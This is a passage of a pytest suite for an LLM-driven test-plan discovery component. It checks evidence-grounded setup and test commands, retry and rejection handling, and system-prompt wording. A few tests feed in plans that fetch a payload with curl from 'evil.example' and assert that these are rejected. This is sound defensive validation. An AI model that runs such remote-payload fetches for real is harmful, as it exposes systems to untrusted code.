            "`pytest --color=yes`) plus CI (alpine-test.yml runs pytest) establish pytest "
            "as the runner; setup.py's extras_require[\"test\"] (from test-requirements.txt) "
            "is installed via `pip install .[test]` exactly as CI does. JUnit XML is added "
            "only to capture per-test results and does not change test selection."
        ),
        # "confidence" deliberately absent -- the real retry response never included it.
    }
    return json.dumps(payload)


def _gitpython_real_repo(tmp_path: Path) -> Path:
    (tmp_path / "pyproject.toml").write_text("[tool.pytest.ini_options]\n", encoding="utf-8")
    (tmp_path / "tox.ini").write_text(
        "[testenv]\ncommands = pytest --color=yes\n", encoding="utf-8",
    )
    (tmp_path / "test-requirements.txt").write_text("pytest\n", encoding="utf-8")
    (tmp_path / "setup.py").write_text(
        "from setuptools import setup\nsetup(extras_require={'test': ['pytest']})\n",
        encoding="utf-8",
    )
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "alpine-test.yml").write_text(
        "jobs:\n  test:\n    steps:\n      - run: pytest --color=yes\n", encoding="utf-8",
    )
    return tmp_path


class TestGitPythonBarePytestRetryRealRunRegression:
    """Reproduces the exact real GitPython CVE-2026-44243 regression-suite
    failure. Two independent things are proven here:

    1. (the actual observed run) initial response missing confidence ->
       exactly one retry fires -> retry response ALSO missing confidence
       (a genuine, repeated model failure, not a code bug) -> exactly two
       calls total -> plan remains rejected, no third retry. This is
       correct, unchanged behavior -- not what this fix addresses.
    2. (isolating the fix) the same retry response, with a valid
       confidence value added back (what a compliant retry would have
       looked like), is now accepted -- proving the ONLY remaining
       obstacle was the bare-"pytest"-binary validation gap."""

    def test_real_run_missing_confidence_twice_remains_rejected_with_exactly_two_calls(self, tmp_path):
        repo = _gitpython_real_repo(tmp_path)
        llm = _SequentialFakeLLM([
            _gitpython_real_initial_response_missing_confidence(),
            _gitpython_real_retry_response_missing_confidence(),
        ])
        plan = discover_test_plan(repo, llm)
        assert plan is None
        assert len(llm.calls) == 2
        assert [call[2] for call in llm.calls] == [
            "test_plan_discovery", "test_plan_discovery_contract_retry",
        ]

    def test_corrected_retry_with_valid_confidence_and_bare_pytest_is_accepted(self, tmp_path):
        repo = _gitpython_real_repo(tmp_path)
        corrected_retry = json.loads(_gitpython_real_retry_response_missing_confidence())
        corrected_retry["confidence"] = "medium"
        llm = _SequentialFakeLLM([
            _gitpython_real_initial_response_missing_confidence(),
            json.dumps(corrected_retry),
        ])
        plan = discover_test_plan(repo, llm)
        assert plan is not None
        assert len(llm.calls) == 2
        assert plan.test_command == ("pytest", "--color=yes", "--junitxml=/tmp/openant-result.xml")
        assert plan.confidence == "medium"
        assert plan.result_strategy == "junit"


# --- A second, independent real GitPython CVE-2026-44243 regression-suite
# finding: a valid, well-evidenced, high-confidence plan's setup_commands
# included "./init-tests-after-clone.sh" -- a real script GitPython's own CI
# directly invokes to prepare the repository for tests, exactly the kind of
# repository-owned entry point _SYSTEM_PROMPT's own "PRESERVE REPOSITORY-
# OWNED ENTRY POINTS" rule tells the model to preserve. Rejected outright by
# test_plan_validation.ALLOWED_COMMAND_BINARIES, which has no notion of a
# repository-owned file at all. Fixed via
# test_plan_command_provenance.resolve_repository_owned_commands -- an
# evidence-backed repository-command model, never a static allowlist entry
# for this one path, never a filename/path heuristic.

def _gitpython_repo_with_init_script(tmp_path: Path) -> Path:
    """_gitpython_real_repo, plus the actual init-tests-after-clone.sh
    script on disk and CI evidence content that directly invokes it --
    the real repository-owned preparation step GitPython's CI performs
    before running pytest."""
    repo = _gitpython_real_repo(tmp_path)
    (repo / "init-tests-after-clone.sh").write_text("#!/bin/sh\ngit submodule update --init\n", encoding="utf-8")
    (repo / ".github" / "workflows" / "alpine-test.yml").write_text(
        "jobs:\n  test:\n    steps:\n"
        "      - run: ./init-tests-after-clone.sh\n"
        "      - run: pytest --color=yes\n",
        encoding="utf-8",
    )
    return repo


def _gitpython_real_response_with_init_script_and_confidence() -> str:
    """The real GitPython initial response shape (see
    007_test_plan_discovery.response.txt), which DID include
    "./init-tests-after-clone.sh" in setup_commands -- with a valid
    confidence value added (the missing-confidence failure is a separate,
    already-fixed concern; see TestGitPythonBarePytestRetryRealRunRegression
    above), isolating the repository-owned-command provenance fix alone."""
    payload = json.loads(_gitpython_real_initial_response_missing_confidence())
    payload["confidence"] = "high"
    return json.dumps(payload)


class TestGitPythonRepositoryOwnedScriptRealRunRegression:
    """Reproduces the exact real GitPython CVE-2026-44243 setup_commands
    rejection: "setup_commands[0] starts with an unrecognized binary:
    './init-tests-after-clone.sh'" -- despite the script being a real,
    CI-evidenced repository preparation step."""

    def test_real_response_with_init_script_is_now_accepted(self, tmp_path):
        repo = _gitpython_repo_with_init_script(tmp_path)
        llm = _FakeLLM(_gitpython_real_response_with_init_script_and_confidence())
        plan = discover_test_plan(repo, llm)
        assert plan is not None
        assert plan.setup_commands == (
            ("pip", "install", ".[test]"),
            ("./init-tests-after-clone.sh",),
        )
        assert plan.test_command == ("pytest", "--color=yes", "--junitxml=/tmp/openant-result.xml")

    def test_makes_exactly_one_llm_call_no_retry_triggered(self, tmp_path):
        """The provenance check is not one of _parse_response's three
        narrow repairable shapes -- a plan that is otherwise perfectly
        schema-valid must never trigger a retry merely because a
        repository-owned command needed provenance checking."""
        repo = _gitpython_repo_with_init_script(tmp_path)
        llm = _FakeLLM(_gitpython_real_response_with_init_script_and_confidence())
        discover_test_plan(repo, llm)
        assert len(llm.calls) == 1

    def test_unevidenced_repository_script_is_rejected_without_retry(self, tmp_path):
        """The provenance rejection path is a plain _reject, exactly like
        an evidence-citation failure -- not repairable, no retry."""
        repo = _gitpython_real_repo(tmp_path)  # no init-tests-after-clone.sh anywhere
        llm = _FakeLLM(_gitpython_real_response_with_init_script_and_confidence())
        plan = discover_test_plan(repo, llm)
        assert plan is None
        assert len(llm.calls) == 1

    def test_rejection_reason_names_the_provenance_failure(self, tmp_path):
        repo = _gitpython_real_repo(tmp_path)
        llm = _FakeLLM(_gitpython_real_response_with_init_script_and_confidence())
        rejection_reason: "list[str]" = []
        plan = discover_test_plan(repo, llm, rejection_reason=rejection_reason)
        assert plan is None
        assert rejection_reason and "init-tests-after-clone.sh" in rejection_reason[0]


class TestMetadataFieldsToleratedWhenMissingNotWhenMalformed:
    """reasoning_summary and runtime_version_hint are genuinely advisory
    metadata (never part of the response CONTRACT the way confidence now
    is -- see the module docstring): their outright absence is tolerated
    and normalized to a safe default, but a malformed VALUE for either
    is still a hard rejection, unchanged. confidence is deliberately NOT
    given this same absence-tolerant treatment (see TestConfidenceMatrix)
    -- these two remain the only fields treated this leniently."""

    def test_missing_runtime_version_hint_defaults_to_none(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("runtime_version_hint"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.runtime_version_hint is None

    def test_missing_reasoning_summary_defaults_to_empty_string(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("reasoning_summary"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.reasoning_summary == ""

    def test_malformed_runtime_version_hint_type_still_rejects_whole_plan(self, tmp_path):
        """Unchanged from before this fix: a WRONG-TYPE value (not
        merely absent) is still a hard rejection, not a silent drop."""
        llm = _FakeLLM(_valid_response(runtime_version_hint=["3.11"]))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_malformed_reasoning_summary_type_still_rejects_whole_plan(self, tmp_path):
        llm = _FakeLLM(_valid_response(reasoning_summary=12345))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_missing_confidence_still_rejects_even_alongside_other_omitted_metadata(self, tmp_path):
        """confidence is NOT in the same lenient bucket as
        runtime_version_hint -- omitting both together must still reject
        the whole response, on confidence's account alone."""
        llm = _FakeLLM(_valid_response_missing("confidence", "runtime_version_hint"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_missing_runtime_version_hint_alone_still_succeeds_with_valid_confidence(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("runtime_version_hint"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert plan.runtime_version_hint is None


class TestExecutionCriticalFieldsStillStrictlyRequired:
    """Explicit regression guard: the metadata tolerance added by this
    fix must NOT have loosened any execution-critical field. Each of
    these must still reject when its key is missing entirely."""

    def test_missing_setup_commands_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("setup_commands"))
        assert discover_test_plan(_repo_with_evidence(tmp_path), llm) is None

    def test_missing_test_command_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("test_command"))
        assert discover_test_plan(_repo_with_evidence(tmp_path), llm) is None

    def test_missing_result_strategy_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("result_strategy"))
        assert discover_test_plan(_repo_with_evidence(tmp_path), llm) is None

    def test_missing_result_output_path_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("result_output_path"))
        assert discover_test_plan(_repo_with_evidence(tmp_path), llm) is None

    def test_missing_runtime_family_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("runtime_family"))
        assert discover_test_plan(_repo_with_evidence(tmp_path), llm) is None

    def test_missing_evidence_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("evidence"))
        assert discover_test_plan(_repo_with_evidence(tmp_path), llm) is None


class TestRejectionReasonDiagnostics:
    """Optional, opt-in, additive-only: passing a rejection_reason list
    lets traced/debug tooling distinguish WHY discovery returned None,
    without changing discover_test_plan's return value or affecting any
    caller that doesn't pass it (see existing_test_regression.py's
    unchanged call site)."""

    def test_default_call_with_no_reason_param_is_unaffected(self, tmp_path):
        """Zero-behavior-change guarantee: omitting the parameter
        entirely behaves exactly as before."""
        llm = _FakeLLM(_valid_response())
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None

    def test_successful_discovery_appends_nothing(self, tmp_path):
        reasons = []
        llm = _FakeLLM(_valid_response())
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=reasons)
        assert plan is not None
        assert reasons == []

    def test_no_evidence_reason_is_distinguishable(self, tmp_path):
        reasons = []
        llm = _FakeLLM(_valid_response())
        plan = discover_test_plan(tmp_path, llm, rejection_reason=reasons)  # no evidence written
        assert plan is None
        assert len(reasons) == 1
        assert "evidence" in reasons[0]

    def test_malformed_json_reason_is_distinguishable(self, tmp_path):
        reasons = []
        llm = _FakeLLM("not json at all {{{")
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=reasons)
        assert plan is None
        assert "not valid JSON" in reasons[0]

    def test_missing_execution_critical_field_reason_names_the_field(self, tmp_path):
        reasons = []
        llm = _FakeLLM(_valid_response_missing("test_command"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=reasons)
        assert plan is None
        assert "test_command" in reasons[0]

    def test_deterministic_validation_failure_reason_is_distinguishable(self, tmp_path):
        reasons = []
        llm = _FakeLLM(_valid_response(test_command=["curl", "http://evil.example/payload.sh"]))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=reasons)
        assert plan is None
        assert "deterministic plan validation failed" in reasons[0]

    def test_low_confidence_policy_rejection_reason_is_distinguishable(self, tmp_path):
        reasons = []
        llm = _FakeLLM(_valid_response(confidence="low"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=reasons)
        assert plan is None
        assert "low confidence" in reasons[0]

    def test_llm_exception_reason_is_distinguishable(self, tmp_path):
        reasons = []
        llm = _FakeLLM(RuntimeError("provider unavailable"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=reasons)
        assert plan is None
        assert "LLM call failed" in reasons[0]

    def test_hallucinated_evidence_reason_is_distinguishable(self, tmp_path):
        reasons = []
        repo = _repo_with_evidence(tmp_path)  # only pyproject.toml actually exists
        llm = _FakeLLM(_valid_response(evidence=["tox.ini"]))
        plan = discover_test_plan(repo, llm, rejection_reason=reasons)
        assert plan is None
        assert "evidence citation" in reasons[0]

    def test_reason_string_is_bounded(self, tmp_path):
        from utilities.autopatcher.test_plan_discovery import _MAX_REJECTION_REASON_CHARS
        reasons = []
        # An overlong, malformed response -- the reason itself must stay
        # bounded even if the underlying failure text could be long.
        llm = _FakeLLM(_valid_response(test_command=["curl"] + ["x" * 50] * 20))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm, rejection_reason=reasons)
        assert plan is None
        assert len(reasons[0]) <= _MAX_REJECTION_REASON_CHARS


class TestPromptRequiresRepositoryGrounding:
    """Prompt-content contract for the repository-grounding fix (see the
    module docstring's real minimist failure example). These assert on
    the SYSTEM PROMPT's instructions, not on model behavior -- there is
    no live LLM call anywhere in this test suite."""

    def test_prompt_states_discovery_not_invention(self):
        assert "YOUR JOB IS DISCOVERY, NOT INVENTION" in _SYSTEM_PROMPT
        assert "NO PLAN IS BETTER THAN A GUESSED PLAN" in _SYSTEM_PROMPT

    def test_prompt_requires_preserving_repository_owned_entry_points(self):
        assert "PRESERVE REPOSITORY-OWNED ENTRY POINTS" in _SYSTEM_PROMPT
        assert '["npm", "test"]' in _SYSTEM_PROMPT
        assert '["npx", "tap", "test/*.js"]' in _SYSTEM_PROMPT

    def test_prompt_prohibits_the_plausible_equivalent_reasoning_pattern(self):
        assert "is NOT safe and is\n      explicitly prohibited" in _SYSTEM_PROMPT or \
               "NOT safe" in _SYSTEM_PROMPT
        assert "therefore I can just run X directly" in _SYSTEM_PROMPT

    def test_prompt_allows_direct_commands_when_evidenced_directly(self):
        assert "When a direct command is appropriate" in _SYSTEM_PROMPT
        assert "evidenced command vs. an unevidenced one you built yourself" in _SYSTEM_PROMPT

    def test_prompt_requires_reconciling_conflicting_evidence_not_guessing(self):
        assert "Reconcile evidence rather than assuming a fixed priority" in _SYSTEM_PROMPT
        assert "do not guess -- treat this the same as insufficient evidence" in _SYSTEM_PROMPT

    def test_prompt_requires_grounding_the_package_manager_choice(self):
        assert "package manager is itself something to ground, not assume" in _SYSTEM_PROMPT
        assert "yarn.lock" in _SYSTEM_PROMPT and "pnpm-lock.yaml" in _SYSTEM_PROMPT
        assert "packageManager" in _SYSTEM_PROMPT

    def test_prompt_requires_grounding_setup_commands_too(self):
        assert "setup_commands follow the identical evidence discipline" in _SYSTEM_PROMPT
        assert "npm ci" in _SYSTEM_PROMPT and "pip install -r" in _SYSTEM_PROMPT

    def test_prompt_requires_command_provenance_in_reasoning_summary(self):
        assert "Command provenance is required, not optional" in _SYSTEM_PROMPT

    def test_prompt_distinguishes_reporting_instrumentation_from_rewriting_the_command(self):
        assert "about REPORTING, layered ON TOP of" in _SYSTEM_PROMPT
        assert "LLM-reconstructed execution semantics is not" in _SYSTEM_PROMPT

    def test_prompt_never_widens_allowed_binaries_for_this_fix(self):
        """This fix is prompt-only -- confirm the deterministic validator's
        allowlist was NOT touched as a side effect (no npx, no shell)."""
        from utilities.autopatcher.test_plan_validation import ALLOWED_COMMAND_BINARIES
        assert "npx" not in ALLOWED_COMMAND_BINARIES
        assert "sh" not in ALLOWED_COMMAND_BINARIES
        assert "bash" not in ALLOWED_COMMAND_BINARIES


def _minimist_shaped_repo(tmp_path: Path) -> Path:
    """Mirrors the actual evidence shape from the real minimist Test Plan
    Discovery run that exposed this bug: package.json declares
    scripts.test = "tap test/*.js", package-lock.json establishes npm as
    the package manager, and CI runs `npm ci` then `npm test` -- the
    repository's own evidenced entry point is `npm test`, never a
    reconstructed `npx tap test/*.js`."""
    (tmp_path / "package.json").write_text(
        json.dumps({
            "name": "minimist", "version": "1.2.8",
            "scripts": {"test": "tap test/*.js"},
        }),
        encoding="utf-8",
    )
    (tmp_path / "package-lock.json").write_text('{"lockfileVersion": 3}\n', encoding="utf-8")
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text(
        "jobs:\n  test:\n    steps:\n      - run: npm ci\n      - run: npm test\n",
        encoding="utf-8",
    )
    return tmp_path


class TestMinimistRepositoryGroundedRegression:
    """Reproduces the exact real minimist failure: package.json declared
    scripts.test = "tap test/*.js" (evidence for a repository-owned test
    entry point) and Test Plan Discovery still returned
    ["npx", "tap", "test/*.js"] -- reconstructing the wrapper's internals
    instead of preserving that entry point. Deterministic fixture, no
    live LLM call: asserts the CORRECT, repository-grounded plan is
    accepted end to end, and that the previously-observed reconstructed
    plan is still rejected by the (unchanged) deterministic validator."""

    def _llm(self, **overrides):
        base = dict(
            setup_commands=[["npm", "ci"]],
            test_command=["npm", "test"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="node", runtime_version_hint=None,
            evidence=["package.json", "package-lock.json", ".github/workflows/ci.yml"],
            reasoning_summary=(
                "package.json defines scripts.test; package-lock.json establishes npm "
                "as the package manager; CI runs npm ci then npm test. The "
                "repository-owned entry point `npm test` is used as-is rather than "
                "reconstructing the tap invocation inside it."
            ),
            confidence="high",
        )
        base.update(overrides)
        return _FakeLLM(_valid_response(**base))

    def test_repository_grounded_plan_is_discovered_and_accepted(self, tmp_path):
        repo = _minimist_shaped_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm())
        assert plan is not None
        assert plan.test_command == ("npm", "test")
        assert plan.setup_commands == (("npm", "ci"),)
        assert plan.runtime_family == "node"
        assert plan.result_strategy == "exit_code"

    def test_reconstructed_npx_tap_command_is_still_rejected(self, tmp_path):
        """Even if a response reproduces the exact real-run mistake, the
        unchanged deterministic validator must still reject it -- this
        fix is about discovery producing the right plan in the first
        place, not about widening what validation will accept."""
        repo = _minimist_shaped_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm(
            test_command=["npx", "tap", "test/*.js"],
            reasoning_summary="Running tap directly via npx.",
        ))
        assert plan is None

    def test_evidence_citations_match_the_actual_minimist_shaped_files(self, tmp_path):
        repo = _minimist_shaped_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm())
        assert plan is not None
        assert set(plan.evidence) <= {"package.json", "package-lock.json", ".github/workflows/ci.yml"}


def _real_minimist_v1_2_5_repo(tmp_path: Path) -> Path:
    """The ACTUAL real minimist v1.2.5 evidence shape (not the
    lockfile+CI-equipped fixture above) -- package.json only, no
    package-lock.json/yarn.lock/pnpm-lock.yaml, no CI workflow, no
    "packageManager" field. Confirmed directly against the real
    checked-out repository: `npm test` fails with "sh: tap: command not
    found" (exit 127) without an install step first; the same command
    succeeds after `npm install`. This is the exact fixture the
    setup-command-grounding fix targets."""
    (tmp_path / "package.json").write_text(
        json.dumps({
            "name": "minimist", "version": "1.2.5",
            "devDependencies": {"covert": "^1.0.0", "tap": "~0.4.0", "tape": "^3.5.0"},
            "scripts": {"test": "tap test/*.js", "coverage": "covert test/*.js"},
        }),
        encoding="utf-8",
    )
    (tmp_path / "index.js").write_text("module.exports = function () {}\n", encoding="utf-8")
    (tmp_path / "test").mkdir()
    (tmp_path / "test" / "parse.js").write_text("require('tape')\n", encoding="utf-8")
    return tmp_path


class TestSetupCommandRepositoryGrounding:
    """Problem: the real minimist evidence shape above previously
    accepted setup_commands=[] for a `npm test` entry point that fails
    with "tap: command not found" in a clean container -- package.json's
    own devDependencies declare the exact tool the entry point invokes.
    See test_plan_discovery.py's module docstring "Setup-command
    grounding" paragraph and test_evidence_acquisition.py's
    _package_json_relevant_fields docstring for the two-part root cause
    (evidence never showed devDependencies; the prompt didn't treat a
    manifest's own dependency declaration as sufficient setup evidence).

    Deterministic fixtures throughout -- no live LLM call."""

    def _llm(self, **overrides):
        base = dict(
            setup_commands=[["npm", "install"]],
            test_command=["npm", "test"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="node", runtime_version_hint=None,
            evidence=["package.json"],
            reasoning_summary=(
                "package.json's scripts.test runs `tap test/*.js`; devDependencies "
                "declares tap (and tape, covert) as project dependencies that will "
                "not exist in a fresh checkout. No lockfile is present, so `npm "
                "install` (not `npm ci`) prepares them; the repository-owned entry "
                "point `npm test` is used as-is."
            ),
            confidence="medium",
        )
        base.update(overrides)
        return _FakeLLM(_valid_response(**base))

    # --- 2. the expected minimist-shaped plan is accepted end to end ---

    def test_minimist_shaped_plan_with_npm_install_is_accepted(self, tmp_path):
        repo = _real_minimist_v1_2_5_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm())
        assert plan is not None
        assert plan.setup_commands == (("npm", "install"),)
        assert plan.test_command == ("npm", "test")
        assert plan.result_strategy == "exit_code"
        assert plan.result_output_path is None
        assert plan.runtime_family == "node"

    # --- 3. no lockfile -> npm ci is not required/assumed; npm install is fine ---

    def test_npm_install_is_accepted_without_any_lockfile_present(self, tmp_path):
        repo = _real_minimist_v1_2_5_repo(tmp_path)
        assert not (repo / "package-lock.json").exists()
        assert not (repo / "npm-shrinkwrap.json").exists()
        plan = discover_test_plan(repo, self._llm())
        assert plan is not None
        assert plan.setup_commands == (("npm", "install"),)

    def test_npm_ci_is_also_structurally_valid_even_though_unevidenced_here(self, tmp_path):
        """This fix does not add a NEW validation rule forbidding "npm
        ci" without a lockfile -- that would be a semantic check this
        architecture deliberately doesn't attempt (see
        test_plan_validation.py's docstring: it enforces the execution
        *contract*, not runner-specific correctness). The discipline
        against guessing "npm ci" without a lockfile is a PROMPT-level
        instruction (see TestSetupCommandPromptContract below), not a new
        deterministic gate -- documented explicitly so this fix is never
        mistaken for having added one."""
        repo = _real_minimist_v1_2_5_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm(setup_commands=[["npm", "ci"]]))
        assert plan is not None
        assert plan.setup_commands == (("npm", "ci"),)

    # --- 4. npm test remains the canonical, unchanged entry point ---

    def test_test_command_is_unchanged_regardless_of_setup(self, tmp_path):
        repo = _real_minimist_v1_2_5_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm())
        assert plan is not None
        assert plan.test_command == ("npm", "test")

    # --- 5. no npx reconstruction, even with the corrected setup ---

    def test_npx_tap_reconstruction_is_still_rejected_even_with_correct_setup(self, tmp_path):
        repo = _real_minimist_v1_2_5_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm(test_command=["npx", "tap", "test/*.js"]))
        assert plan is None

    # --- 7. no setup command is invented when evidence genuinely doesn't support it ---

    def test_no_setup_invented_when_no_dependency_manifest_declares_the_tool(self, tmp_path):
        """A bespoke command with nothing in the evidence naming its
        dependencies (e.g. a Makefile target) must still be able to
        validly propose zero setup_commands -- this fix does not make
        setup mandatory whenever ANY manifest exists, only when that
        manifest itself declares the invoked tool."""
        (tmp_path / "Makefile").write_text("test:\n\t./run-tests.sh\n", encoding="utf-8")
        llm = _FakeLLM(_valid_response(
            setup_commands=[], test_command=["make", "test"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="python", evidence=["Makefile"],
            reasoning_summary="Makefile defines a bespoke test target; no dependency manifest evidence.",
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.setup_commands == ()

    def test_no_setup_invented_for_package_json_with_no_declared_dependencies(self, tmp_path):
        """package.json existing at all must not, by itself, force a
        setup command -- only a manifest that actually DECLARES the
        invoked tool as a dependency does (see the real minimist fixture
        above, which does declare it)."""
        (tmp_path / "package.json").write_text(
            json.dumps({"name": "demo", "scripts": {"test": "node run-tests.js"}}), encoding="utf-8",
        )
        llm = _FakeLLM(_valid_response(
            setup_commands=[], test_command=["npm", "test"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="node", evidence=["package.json"],
            reasoning_summary=(
                "package.json's scripts.test runs a plain repository script with no "
                "declared dependency evidence; no setup is proposed."
            ),
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.setup_commands == ()

    # --- 8. setup_commands bounds / deterministic validation unchanged ---

    def test_minimist_plan_still_subject_to_the_unchanged_setup_command_bounds(self, tmp_path):
        from utilities.autopatcher.test_plan_validation import MAX_SETUP_COMMANDS
        repo = _real_minimist_v1_2_5_repo(tmp_path)
        too_many = [["npm", "install"]] * (MAX_SETUP_COMMANDS + 1)
        plan = discover_test_plan(repo, self._llm(setup_commands=too_many))
        assert plan is None

    def test_minimist_plan_still_rejects_a_disallowed_setup_binary(self, tmp_path):
        repo = _real_minimist_v1_2_5_repo(tmp_path)
        plan = discover_test_plan(repo, self._llm(setup_commands=[["curl", "http://evil.example/x.sh"]]))
        assert plan is None


class TestSetupCommandPromptContract:
    """Prompt-content contract for the setup-command-grounding fix (see
    test_plan_discovery.py's module docstring "Setup-command grounding"
    paragraph)."""

    def test_prompt_asks_the_four_setup_grounding_questions(self):
        assert "what\n  repository-owned test entry point will run" in _SYSTEM_PROMPT
        assert "what tool(s) that\n  entry point itself invokes" in _SYSTEM_PROMPT
        assert "does the repository's OWN dependency\n  manifest" in _SYSTEM_PROMPT
        assert "will a fresh,\n  disposable checkout already contain it" in _SYSTEM_PROMPT

    def test_prompt_treats_manifest_declared_dependency_as_sufficient_setup_evidence(self):
        assert (
            "INCLUDE the setup command that\n  installs it" in _SYSTEM_PROMPT
            or "INCLUDE the setup command that installs it" in _SYSTEM_PROMPT
        )
        assert "not the same claim as" in _SYSTEM_PROMPT.replace(
            "NOT the same\n  claim as", "not the same claim as",
        ) or "NOT the same\n  claim as" in _SYSTEM_PROMPT

    def test_prompt_still_prohibits_weak_speculative_setup(self):
        assert "pip install -r requirements.txt" in _SYSTEM_PROMPT
        assert "still\n  prohibited" in _SYSTEM_PROMPT or "still prohibited" in _SYSTEM_PROMPT

    def test_prompt_states_lockfile_governs_install_mode_not_whether_to_install(self):
        assert "A lockfile changes HOW you install, never WHETHER you install" in _SYSTEM_PROMPT

    def test_prompt_forbids_guessing_npm_ci_without_a_lockfile(self):
        assert 'Never propose\n      "npm ci"' in _SYSTEM_PROMPT or 'Never propose "npm ci"' in _SYSTEM_PROMPT
        assert "never invent or assume" in _SYSTEM_PROMPT

    def test_prompt_uses_the_same_manager_already_established_for_test_command(self):
        assert "using the SAME package manager you established for the" in _SYSTEM_PROMPT

    def test_prompt_states_npm_as_absence_of_contrary_evidence_default(self):
        """The package-manager tie-break: npm needs no separate install
        to exist, unlike yarn/pnpm, when nothing distinguishes a
        manager."""
        assert "ships with Node itself" in _SYSTEM_PROMPT
        assert "absence-of-contrary-evidence\n  default" in _SYSTEM_PROMPT or \
               "absence-of-contrary-evidence default" in _SYSTEM_PROMPT

    def test_prompt_does_not_hardcode_a_setup_lookup_table(self):
        """The generic cross-ecosystem principle is stated via EXAMPLES,
        explicitly labeled as such -- not a lookup table to pattern-match
        (see test_plan_discovery.py's module docstring)."""
        assert "not a table to pattern-match" in _SYSTEM_PROMPT
        assert "not a per-ecosystem\n      lookup table" in _SYSTEM_PROMPT or \
               "not a per-ecosystem lookup table" in _SYSTEM_PROMPT


class TestTapResultStrategyPromptContract:
    """Prompt-content contract for Problem 2's TAP result-format rule
    (see the module docstring's "TAP's evidence bar is deliberately
    narrower than junit's" paragraph, grounded in the real minimist `tap`
    v0.4.13 CLI inspection: its default, unmodified output is a
    human-readable summary, not TAP -- real TAP needs an added `--tap`
    flag/`TAP=1` env var this feature is not permitted to add)."""

    def test_schema_declares_tap_as_a_result_strategy(self):
        assert '"result_strategy": "junit" | "tap" | "exit_code"' in _SYSTEM_PROMPT

    def test_prompt_requires_unmodified_normal_invocation_to_emit_tap(self):
        assert 'Use result_strategy = "tap" ONLY when' in _SYSTEM_PROMPT
        assert "NORMAL invocation" in _SYSTEM_PROMPT
        assert "no added flag" in _SYSTEM_PROMPT and "no added environment variable" in _SYSTEM_PROMPT

    def test_prompt_forbids_name_based_tap_guessing(self):
        """The exact real minimist failure mode this rule guards against:
        inferring "tap" merely because a script/dependency is NAMED
        tap/tape, rather than because its normal invocation actually
        emits TAP."""
        assert 'Do NOT infer "tap" merely because' in _SYSTEM_PROMPT
        assert 'CONTAINS "tap"' in _SYSTEM_PROMPT and '"tape"' in _SYSTEM_PROMPT

    def test_prompt_requires_null_output_path_for_tap(self):
        assert "result_output_path must\n  be null for \"tap\"" in _SYSTEM_PROMPT or \
               "result_output_path must be null for \"tap\"" in _SYSTEM_PROMPT

    def test_prompt_names_a_genuine_unprompted_tap_example(self):
        """At least one concrete, well-known example of a runner that
        emits TAP with no added flag -- so the rule isn't purely
        abstract, mirroring how the junit rule includes a pytest
        example."""
        assert "node --test" in _SYSTEM_PROMPT

    def test_prompt_directs_uncertain_cases_to_exit_code_same_as_junit(self):
        assert 'this is exactly the same "do not guess" situation as junit' in _SYSTEM_PROMPT


class TestTapResultStrategyDiscovery:
    """Behavioral half of the TAP prompt contract -- deterministic
    fixtures, no live LLM call. A well-evidenced "tap" plan is accepted
    end to end; a plan that claims "tap" from name-based guessing alone
    is still rejected by the UNCHANGED deterministic validator (evidence
    citation/validation, not the prompt, is the actual enforcement
    boundary -- the prompt only makes a compliant response more likely)."""

    def _node_test_runner_repo(self, tmp_path: Path) -> Path:
        (tmp_path / "package.json").write_text(
            json.dumps({"name": "demo", "scripts": {"test": "node --test"}}), encoding="utf-8",
        )
        return tmp_path

    def test_well_evidenced_tap_plan_is_accepted(self, tmp_path):
        repo = self._node_test_runner_repo(tmp_path)
        llm = _FakeLLM(_valid_response(
            setup_commands=[], test_command=["node", "--test"],
            result_strategy="tap", result_output_path=None,
            runtime_family="node", evidence=["package.json"],
            reasoning_summary=(
                "package.json's scripts.test runs Node's built-in test runner "
                "(`node --test`), which emits TAP directly with no added flag; "
                "the repository-owned entry point is preserved as-is."
            ),
            confidence="high",
        ))
        plan = discover_test_plan(repo, llm)
        assert plan is not None
        assert plan.result_strategy == "tap"
        assert plan.result_output_path is None
        assert plan.test_command == ("node", "--test")

    def test_tap_plan_with_a_result_output_path_is_still_rejected(self, tmp_path):
        """The prompt says null; validate_plan enforces it regardless --
